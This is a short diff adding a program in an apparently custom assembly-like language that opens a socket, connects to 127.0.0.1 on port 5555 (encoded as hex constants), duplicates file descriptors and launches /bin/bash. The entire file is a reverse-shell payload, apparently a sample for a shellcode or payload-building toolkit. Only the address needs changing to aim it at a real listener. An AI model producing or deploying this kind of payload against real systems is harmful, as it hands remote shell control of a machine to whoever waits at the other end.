@@ -1,0 +1,15 @@
+!link ../lib/stdlib/network.mkpk
+!link ../lib/stdlib/syscall.mkpk
+!link ../lib/stdlib/execve.mkpk
+
+[[data]]
+port: 0xb315
+addr: 0x0100007f
+
+[[code]]
+[main]
+> socket
+> connect "addr" "port"
+> dup2
+> bin_bash
+> sys_exit
